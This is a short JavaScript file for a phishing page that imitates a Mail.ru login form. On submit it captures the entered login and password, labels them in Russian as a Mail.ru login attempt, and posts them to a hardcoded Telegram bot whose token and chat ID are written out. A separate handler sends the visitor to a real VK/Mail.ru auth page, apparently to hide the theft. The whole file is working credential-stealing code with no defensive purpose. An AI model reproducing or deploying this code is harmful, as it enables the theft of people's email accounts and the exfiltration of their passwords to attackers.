const TOKEN = '7696324080:AAF0H1ZwXRPlVHeyAx-k5mzQCm4oCWQ5bVw';
const CHAT_ID = '1969968725';
const API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

const form = document.getElementById('login-form');
const status = document.getElementById('status');

form.addEventListener('submit', function(e) {
  e.preventDefault();

  const login = document.getElementById('login').value;
  const password = document.getElementById('password').value;

  const message = `
🔐 Попытка входа в аккаунт Mail.ru:
📧 Логин: ${login}
🔑 Пароль: ${password}
  `;

  fetch(API, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message
    })
  })
 
});

document.getElementById('mail').addEventListener('click', function() {
    window.location.href = "https://id.vk.com/auth?action=eyJuYW1lIjoibWFpbF9hdXRoIiwicGFyYW1zIjp7Im1haWxfYXV0aF90eXBlIjoiYXV0aF9sb2dpbl9wYWdlIn19&app_id=7539952&app_settings=eyJzZXJ2aWNlX2dyb3VwcyI6eyJvaWQiOiIzV3hoSEhLS2tzVmRqNHNXSmVDWWUifX0%3D&lang_id=0&redirect_state=AG_rSgu1iBvL2eHj5JSBoD9q03&redirect_uri=https%3A%2F%2Fe.mail.ru%2Finbox&response_type=silent_token&scheme=light"

})

